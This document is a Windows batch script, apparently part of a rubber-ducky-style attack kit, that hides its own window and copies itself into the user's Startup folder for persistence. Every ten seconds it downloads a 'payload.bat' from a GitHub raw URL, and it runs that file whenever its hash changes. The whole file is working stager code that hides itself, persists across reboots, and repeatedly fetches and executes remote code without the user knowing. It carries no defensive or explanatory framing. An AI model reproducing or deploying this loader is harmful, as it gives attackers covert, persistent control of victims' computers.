@echo off
title PC2_LISTENER

if "%1" neq "hidden" (
    powershell -windowstyle hidden -command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit
)
setlocal enabledelayedexpansion

:: Path to user's Startup folder
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Path to this script
set "me=%~f0"

:: Path where this script SHOULD be in Startup
set "dest=%startup%\%~nx0"

:: Check if already in Startup
if /i "%me%"=="%dest%" (
    echo Already running from Startup.
) else (
    echo Not in Startup. Copying to Startup folder...
    copy "%me%" "%dest%" >nul
)

set "url=https://raw.githubusercontent.com/dexovision/rubitoutducky/main/payload.bat"
set "local=%USERPROFILE%\payload.bat"
set "temp=%TEMP%\payload_new.bat"
set "interval=10"

echo === Updater started ===

:main
echo.
echo Checking for updates...

if not exist "%local%" goto download_initial
goto download_temp

:download_initial
echo Local payload missing — downloading...
powershell -NoProfile -Command "Invoke-WebRequest '%url%' -OutFile '%local%'"
echo Running initial payload...
start "" "%local%"
goto waitloop


:download_temp
powershell -NoProfile -Command "Invoke-WebRequest '%url%' -OutFile '%temp%'"

if not exist "%temp%" (
    echo Failed to download temp payload.
    goto waitloop
)

:: --- HASH BOTH FILES ---
for /f "tokens=1" %%A in ('certutil -hashfile "%local%" SHA256 ^| findstr /r /v "hash"') do set hash_local=%%A
for /f "tokens=1" %%A in ('certutil -hashfile "%temp%" SHA256 ^| findstr /r /v "hash"') do set hash_temp=%%A

echo Local Hash: !hash_local!
echo Temp   Hash: !hash_temp!

if "!hash_local!"=="!hash_temp!" goto identical_files
goto different_files


:identical_files
echo Files identical — deleting temp file.
del "%temp%"
goto waitloop


:different_files
echo Update detected! Installing new payload...
del "%local%"
move /y "%temp%" "%local%"
echo Running updated payload...
start "" "%local%"
goto waitloop


:waitloop
echo Waiting %interval% seconds...
timeout /t %interval% >nul
goto main
